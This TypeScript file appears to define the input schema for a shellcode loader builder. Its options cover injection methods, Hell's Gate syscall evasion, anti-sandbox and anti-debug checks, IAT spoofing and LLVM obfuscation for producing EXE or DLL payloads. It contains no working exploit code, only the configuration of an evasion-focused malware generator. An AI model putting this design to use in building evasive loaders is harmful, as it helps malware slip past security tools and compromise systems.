import { z } from 'zod';

export const PayloadSchema = z.object({
    name: z.string().min(1, "Name is required"),
    output: z.enum(['exe', 'dll']),
    shellcode: z.string().optional(),
    shellcode_url: z.string().url().optional(),
    xor_key: z.string().optional(),
    injection_method: z.enum([
        'fiber',
        'thread',
        'early_bird',
    ]),
    syscall_evasion: z.enum([
        'hells_gate',
        'unhooking_classique',
        'none'
    ]),
    anti_sandbox: z.array(z.enum([
        'cpu_ram',
        'timing',
        'human_behavior'
    ])).default([]),
    anti_debug: z.array(z.enum([
        'is_debugger_present',
        'nt_global_flag'
    ])).default([]),
    iat_spoofing: z.array(z.object({
        dll: z.string(),
        function_name: z.string()
    })).default([]),
    export_function_name: z.string().optional().default('DllMain'),
    gui_mode: z.boolean().optional().default(false),
    use_llvm: z.boolean().optional().default(false),
    llvm_pass: z.enum(['shuffle-strings', 'replace-null-by-prime-formula']).optional()
}).refine(data => {
    // Check mutual exclusivity
    if (data.shellcode && data.shellcode_url) {
        return false;
    }
    // Check at least one is provided
    if (!data.shellcode && !data.shellcode_url) {
        return false;
    }
    return true;
}, {
    message: "You must provide either 'shellcode' or 'shellcode_url', but not both.",
    path: ['shellcode'] // Attach error to shellcode field
});

export type PayloadRequest = z.infer<typeof PayloadSchema>;
